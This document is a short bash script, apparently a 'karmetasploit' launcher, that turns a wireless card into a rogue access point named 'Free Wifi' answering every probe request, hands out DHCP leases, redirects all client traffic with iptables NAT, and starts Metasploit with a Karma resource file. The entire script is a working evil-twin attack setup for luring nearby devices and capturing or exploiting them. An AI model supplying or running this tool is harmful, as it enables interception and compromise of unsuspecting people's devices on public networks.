#!/bin/bash
echo "karmetasploit script by kingtuna: super ultra mega alpha version"
echo "warning: this currently leaves your system in a funny state."
echo "you may have to remove monitor interfaces and kill dhcpd and airbase-ng manually"
killall -9 airbase-ng dhcpd
iptables --flush

#airmon-ng stop $1mon
if [ x"$1" != x ]
then
airmon-ng start $1
else
echo "Please specify a device to use as AP"
exit
fi

#modprobe tun

/usr/sbin/airbase-ng -P -C 30 -c 6 -e "Free Wifi" -v $1mon > /dev/null 2>&1 &
sleep 2
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
ifconfig eth0 up 10.0.0.1 netmask 255.255.255.0
ifconfig $1mon up 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
sleep 2
LEASEFILE="/var/lib/dhcp/dhcpd.leases"
if [ ! -f "$LEASEFILE" ]; then
	touch $LEASEFILE
fi
/usr/sbin/dhcpd -cf /etc/karmeta-dhcpd.conf
sleep 2
ifconfig at0 mtu 1400
iptables -t nat -A PREROUTING -i at0 -j REDIRECT
/usr/bin/msfconsole3 -r /etc/karma.rc
